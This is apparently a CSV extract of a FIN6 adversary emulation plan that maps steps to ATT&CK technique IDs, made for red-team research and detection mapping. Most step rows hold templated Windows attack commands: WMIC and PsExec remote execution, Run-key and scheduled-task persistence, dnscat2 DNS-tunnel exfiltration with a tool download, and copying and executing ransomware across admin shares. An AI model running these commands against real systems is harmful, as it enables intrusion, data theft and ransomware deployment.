org_name,plan_id,scenario_id,step_id,step_order,step_title,step_text,attack_technique_ids_raw,attack_technique_ids_parent,source_file,mapping_method,mapping_quality
fin6,fin6,unknown,fin6::27,27,WMIC Remote Process Execution,"id: 661efd66-d876-41de-88ee-ba9ec4328154 | name: WMIC Remote Process Execution | description: WMIC to execute a process on a remote host. Specify the remote IP using node parameter.  FIN6 is reported to have used WMI to execute code on remote systems. | tactic: execution | technique: attack_id: T1047 | name: Windows Management Instrumentation | cti_source: https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24 | procedure_group: procedure_pos_execution | procedure_step: 5.3 | platforms: windows: cmd: command: wmic /node:#{node} process call create ""#{path_to_execute}""
 | cleanup: wmic /node:#{node} process where name=""#{process_name_to_kill}"" delete >nul 2>&1
 | input_arguments: node: description: IP address | type: string | default: 127.0.0.1 | path_to_execute: description: Name or path of process to execute | type: string | default: notepad.exe | process_name_to_kill: description: Name or path of process to execute | type: string | default: notepad.exe | executors: name: command_prompt | elevation_required: False | command: wmic /node:#{node} process call create ""#{path_to_execute}""
 | cleanup_command: wmic /node:#{node} process where name=""#{process_name_to_kill}"" delete >nul 2>&1
","[""T1047""]","[""T1047""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::28,28,Windows Management Instrumentation,attack_id: T1047 | name: Windows Management Instrumentation,"[""T1047""]","[""T1047""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::29,29,Registry Run Keys,"id: 44d82f6f-f367-4db7-aa65-a9e5717b1a21 | name: Registry Run Keys | description: FIN6 utilizes cmd to execute Registry Run Keys | tactic: persistence | technique: attack_id: T1547.001 | name: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | cti_source: https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems | procedure_group: procedure_pos_persistence | procedure_step: 5.4.1 | platforms: windows: cmd: command: ""C:\Windows\System32\reg.exe"" ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ""#{value_name}"" /t REG_SZ /d ""#{data}"" /f
 | input_arguments: value_name: description: Name of the registry entry to be added | type: string | data: description: Data for new registry entry | type: string | executors: name: command_prompt | command: ""C:\Windows\System32\reg.exe"" ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ""#{value_name}"" /t REG_SZ /d ""#{data}"" /f
","[""T1547.001""]","[""T1547""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::30,30,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,attack_id: T1547.001 | name: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,"[""T1547.001""]","[""T1547""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::31,31,Scheduled Task Persistence,"id: 0864a91a-ae17-1cce-8b89-d4f8f2854699 | name: Scheduled Task Persistence | description: FIN6 utilizes cmd to execute Scheduled Tasks | tactic: persistence | technique: attack_id: T1053.005 | name: Scheduled Task/Job: Scheduled Task | cti_source: https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems | procedure_group: procedure_pos_persistence | procedure_step: 5.4.2 | platforms: windows: cmd: command: ""C:\Windows\System32\schtasks.exe"" /create /tn ""#{task_name}"" /tr ""#{task_run}"" /sc #{schedule} /ru System
 | input_arguments: task_name: description: Task Name | type: string | task_run: description: Path of task to run | type: string | schedule: description: Schedule for task (MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, and ONEVENT) | type: string | executors: name: command_prompt | command: ""C:\Windows\System32\schtasks.exe"" /create /tn ""#{task_name}"" /tr ""#{task_run}"" /sc #{schedule} /ru System
","[""T1053.005""]","[""T1053""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::32,32,Scheduled Task/Job: Scheduled Task,attack_id: T1053.005 | name: Scheduled Task/Job: Scheduled Task,"[""T1053.005""]","[""T1053""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::33,33,dnscat2-powershell Exfiltration,"id: e74554b8-0bc9-3d50-95a4-e45421925b49 | name: dnscat2-powershell Exfiltration | description: Powershell to execute POS data exfiltration over DNS tunnel via dnscat2 | tactic: exfiltration | technique: attack_id: T1048.003 | name: Exfiltration Over Alternative Protocol: Unencrypted/Obfuscated Non-C2 Protocol | cti_source: https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24 | procedure_group: procedure_pos_exfiltration | procedure_step: 5.5 | platforms: windows: psh: command: import-module ""#{dnscat_ps1}""
Start-Dnscat2 -Domain #{dnscat2_server} -Exec cmd
 | payloads: dnscat2.ps1 | input_arguments: dnscat_ps1: description: Path of dnscat2.ps1 | type: Path | default: C:\dnscat2.ps1 | dnscat2_url: description: Path to download dnscat2 .ps1 file | type: URL | default: https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1 | dnscat2_server: description: IP address | type: string | default: 127.0.0.1 | dependency_executor_name: powershell | dependencies: description: dnscat2.ps1 must exist on disk at specified location (#{dnscat_ps1})
 | prereq_command: if (Test-Path ""#{dnscat_ps1}"") {exit 0} else {exit 1}
 | get_prereq_command: Invoke-WebRequest ""#{dnscat2_url}"" -OutFile ""#{dnscat_ps1}""
 | executors: name: powershell | command: import-module ""#{dnscat_ps1}""
Start-Dnscat2 -Domain #{dnscat2_server} -Exec cmd
","[""T1048.003""]","[""T1048""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::34,34,Exfiltration Over Alternative Protocol: Unencrypted/Obfuscated Non-C2 Protocol,attack_id: T1048.003 | name: Exfiltration Over Alternative Protocol: Unencrypted/Obfuscated Non-C2 Protocol,"[""T1048.003""]","[""T1048""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::35,35,WMI Ransomware Distribution,"id: b393c022-329a-4c52-ab1f-eb594ee8d3cd | name: WMI Ransomware Distribution | description: FIN6 utilizes WMI to distribute ransomware to intended targets | tactic: execution | technique: attack_id: T1047 | name: Windows Management Instrumentation | cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html | procedure_group: procedure_ransomware_distribution | procedure_step: 7.1.1 | platforms: windows: cmd: command: start wmic /node:#{Ransomware_recipient} /user:#{domain_user} /password:#{password} process call create ""cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\sss.exe c:\windows\temp\""
 | input_arguments: Ransomware_recipient: description: Hostname or IP address | type: string | default: 127.0.0.1 | domain_user: description: domain\\user | type: string | default: user | password: description: user password | type: string | internal_IP: description: Hostname or IP address | type: string | default: 127.0.0.1 | executors: name: command_prompt | command: start wmic /node:#{Ransomware_recipient} /user:#{domain_user} /password:#{password} process call create ""cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\sss.exe c:\windows\temp\""
","[""T1047""]","[""T1047""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::36,36,Windows Management Instrumentation,attack_id: T1047 | name: Windows Management Instrumentation,"[""T1047""]","[""T1047""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::37,37,Copy Ransomware,"id: f50f8f39-2fb0-4fe3-9e2d-9af38aee447d | name: Copy Ransomware | description: FIN6 utilizes cmd to copy ransomware to an internal distribution server | tactic: lateral-movement | technique: attack_id: T1021.002 | name: Remote Services: SMB/Windows Admin Shares | cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html | procedure_group: procedure_lateral_movement | procedure_step: 7.1.2 | platforms: windows: cmd: command: start copy sss.exe \\#{internal_IP}\c$\windows\temp\
 | input_arguments: internal_IP: description: Hostname or IP address | type: string | default: 127.0.0.1 | executors: name: command_prompt | command: start copy sss.exe \\#{internal_IP}\c$\windows\temp\
","[""T1021.002""]","[""T1021""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::38,38,Remote Services: SMB/Windows Admin Shares,attack_id: T1021.002 | name: Remote Services: SMB/Windows Admin Shares,"[""T1021.002""]","[""T1021""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::39,39,Copy Distribution Scripts,"id: e45dc48f-45f1-42d2-850c-4a15385c1646 | name: Copy Distribution Scripts | description: FIN6 utilizes cmd to copy distribution scripts to an internal distribution server | tactic: lateral-movement | technique: attack_id: T1021.002 | name: Remote Services: SMB/Windows Admin Shares | cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html | procedure_group: procedure_lateral_movement | procedure_step: 7.1.3 | platforms: windows: cmd: command: start copy xaa.bat \\#{internal_IP}\c$\windows\temp\
 | input_arguments: internal_IP: description: Hostname or IP address | type: string | default: 127.0.0.1 | executors: name: command_prompt | command: start copy xaa.bat \\#{internal_IP}\c$\windows\temp\
","[""T1021.002""]","[""T1021""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::40,40,Remote Services: SMB/Windows Admin Shares,attack_id: T1021.002 | name: Remote Services: SMB/Windows Admin Shares,"[""T1021.002""]","[""T1021""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::41,41,Copy Kill Scripts,"id: 6ffca252-9eb0-4ac0-93dd-35c9e7c6fae0 | name: Copy Kill Scripts | description: FIN6 utilizes cmd to copy kill scripts to an internal distribution server | tactic: lateral-movement | technique: attack_id: T1021.002 | name: Remote Services: SMB/Windows Admin Shares | cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html | procedure_group: procedure_ransomware_copy | procedure_step: 7.1.4 | platforms: windows: cmd: command: copy #{batch_file} \\#{internal_IP}\c$\windows\temp\
 | input_arguments: internal_IP: description: Hostname or IP address | type: string | default: 127.0.0.1 | batch_file: description: windows.bat or kill.bat | type: string | executors: name: command_prompt | command: copy #{batch_file} \\#{internal_IP}\c$\windows\temp\
","[""T1021.002""]","[""T1021""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::42,42,Remote Services: SMB/Windows Admin Shares,attack_id: T1021.002 | name: Remote Services: SMB/Windows Admin Shares,"[""T1021.002""]","[""T1021""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::43,43,Distribute Ransomware via WMI,"id: 5599b7cf-6e8d-43c1-a311-e953dd0fbd2a | name: Distribute Ransomware via WMI | description: FIN6 utilizes WMI to distribute ransomware to intended targets | tactic: execution | technique: attack_id: T1047 | name: Windows Management Instrumentation | cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html | procedure_group: procedure_ransomware_distribute | procedure_step: 7.2.1 | platforms: windows: cmd: command: start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create ""cmd.exe /c copy \\#{distribution_server}\c$\windows\temp\sss.exe c:\windows\temp\""
 | input_arguments: internal_IP: description: Hostname or IP address of remote (victim internal network) system | type: string | default: 127.0.0.1 | distribution_server: description: Hostname of IP address of distribution server | type: string | default: 127.0.0.1 | domain_user: description: Domain and username | type: string | password: description: Remote host or IP address | type: string | executors: name: command_prompt | elevation_required: True | command: start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create ""cmd.exe /c copy \\#{distribution_server}\c$\windows\temp\sss.exe c:\windows\temp\""
","[""T1047""]","[""T1047""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::44,44,Windows Management Instrumentation,attack_id: T1047 | name: Windows Management Instrumentation,"[""T1047""]","[""T1047""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::45,45,Distribute Kill Scripts via WMI,"id: 5dcbd042-e8e5-4f3f-8055-7284e4d5112c | name: Distribute Kill Scripts via WMI | description: FIN6 has utilized WMI to distribute kill scripts to intended targets | tactic: execution | technique: attack_id: T1047 | name: Windows Management Instrumentation | cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html | procedure_group: procedure_ransomware_distribute | procedure_step: 7.2.2 | platforms: windows: cmd: command: start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create ""cmd.exe /c copy \\#{distribution_server}\c$\windows\temp\#{batch_file} c:\windows\temp\""
 | input_arguments: internal_IP: description: Hostname or IP address of remote (victim internal network) system | type: string | default: 127.0.0.1 | distribution_server: description: Hostname of IP address of distribution server | type: string | default: 127.0.0.1 | domain_user: description: Domain and username | type: string | password: description: Valid Password | type: string | batch_file: description: windows.bat or kill.bat | type: string | executors: name: command_prompt | elevation_required: True | command: start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create ""cmd.exe /c copy \\#{distribution_server}\c$\windows\temp\#{batch_file} c:\windows\temp\""
","[""T1047""]","[""T1047""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::46,46,Windows Management Instrumentation,attack_id: T1047 | name: Windows Management Instrumentation,"[""T1047""]","[""T1047""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::47,47,Execute Kill Scripts via WMI,"id: eb4c2ff6-3534-404c-bf1c-d864a508c162 | name: Execute Kill Scripts via WMI | description: FIN6 has utilized WMI to execute kill scripts on intended targets | tactic: execution | technique: attack_id: T1047 | name: Windows Management Instrumentation | cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html | procedure_group: procedure_ransomware_execute_wmic | procedure_step: 7.3.1 | platforms: windows: cmd: command: start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create ""cmd /c c:\windows\temp\#{batch_file}""
 | input_arguments: internal_IP: description: Hostname or IP address | type: string | default: 127.0.0.1 | domain_user: description: Domain and username | type: string | password: description: Valid Password | type: string | batch_file: description: windows.bat or kill.bat | type: string | executors: name: command_prompt | elevation_required: True | command: start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create ""cmd /c c:\windows\temp\#{batch_file}""
","[""T1047""]","[""T1047""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::48,48,Windows Management Instrumentation,attack_id: T1047 | name: Windows Management Instrumentation,"[""T1047""]","[""T1047""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::49,49,Execute Ransomware via WMIC,"id: c29e9cc7-b34f-46c2-bdbe-a41f757eae24 | name: Execute Ransomware via WMIC | description: FIN6 has utilized WMI to execute the ransomware on intended targets | tactic: execution | technique: attack_id: T1047 | name: Windows Management Instrumentation | cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html | procedure_group: procedure_ransomware_execute_wmic | procedure_step: 7.3.2 | platforms: windows: cmd: command: start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create ""cmd /c c:\windows\temp\sss.exe""
 | input_arguments: internal_IP: description: Hostname or IP address | type: string | default: 127.0.0.1 | domain_user: description: Domain and username | type: string | password: description: Valid Password | type: string | executors: name: command_prompt | elevation_required: True | command: start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create ""cmd /c c:\windows\temp\sss.exe""
","[""T1047""]","[""T1047""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::50,50,Windows Management Instrumentation,attack_id: T1047 | name: Windows Management Instrumentation,"[""T1047""]","[""T1047""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::51,51,Execute Kill Scripts via PsExec,"id: 0c752dce-9302-4465-805f-522650aece3f | name: Execute Kill Scripts via PsExec | description: FIN6 has utilized PsExec to execute kill scripts on intended targets | tactic: execution | technique: attack_id: T1569.002 | name: System Services: Service Execution | cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html | procedure_group: procedure_ransomware_execute_psexec | procedure_step: 7.3.3 | platforms: windows: cmd: command: start ""#{psexec_exe}"" \\#{internal_IP} -u #{domain_user} -p #{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\#{batch_file}
 | payloads: psexec.exe | input_arguments: psexec_exe: description: Path to Psexec | type: string | default: C:\PSTools\PsExec.exe | internal_IP: description: Hostname or IP address | type: string | default: 127.0.0.1 | domain_user: description: Domain and username | type: string | password: description: Valid Password | type: string | batch_file: description: windows.bat or kill.bat | type: string | executors: name: command_prompt | elevation_required: True | command: start ""#{psexec_exe}"" \\#{internal_IP} -u #{domain_user} -p #{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\#{batch_file}
","[""T1569.002""]","[""T1569""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::52,52,System Services: Service Execution,attack_id: T1569.002 | name: System Services: Service Execution,"[""T1569.002""]","[""T1569""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::53,53,Execute Ransomware via PsExec,"id: d77838f6-d562-3480-ad29-2cbeee8b7b45 | name: Execute Ransomware via PsExec | description: FIN6 has utilized PsExec to execute ransomware on intended targets | tactic: execution | technique: attack_id: T1569.002 | name: System Services: Service Execution | cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html | procedure_group: procedure_ransomware_psexec | procedure_step: 7.3.4 | platforms: windows: cmd: command: start ""#{psexec_exe}"" \\#{internal_IP} -u #{domain_user} -p #{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe
 | payloads: psexec.exe | input_arguments: psexec_exe: description: Path to Psexec | type: string | default: C:\PSTools\PsExec.exe | internal_IP: description: Hostname or IP address | type: string | default: 127.0.0.1 | domain_user: description: Domain and username | type: string | password: description: Valid Password | type: string | executors: name: command_prompt | elevation_required: True | command: start ""#{psexec_exe}"" \\#{internal_IP} -u #{domain_user} -p #{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe
","[""T1569.002""]","[""T1569""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::54,54,System Services: Service Execution,attack_id: T1569.002 | name: System Services: Service Execution,"[""T1569.002""]","[""T1569""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
